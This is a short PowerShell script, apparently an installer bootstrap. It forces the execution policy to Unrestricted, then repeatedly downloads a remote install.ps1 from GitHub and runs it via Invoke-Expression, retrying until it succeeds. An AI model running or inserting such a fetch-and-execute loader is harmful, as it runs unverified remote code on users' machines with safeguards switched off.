Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
Start-Sleep -Seconds 30

while ($true) {
    try {
        $script = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/saschazesiger/guarddownload-sl52610lmu7ayhb56tacs/refs/heads/main/install.ps1" -UseBasicParsing -ErrorAction Stop
        Invoke-Expression $script.Content
        break
    }
    catch {
        Write-Host "Download fehlgeschlagen, neuer Versuch in 10 Sekunden..."
        Start-Sleep -Seconds 10
    }
}
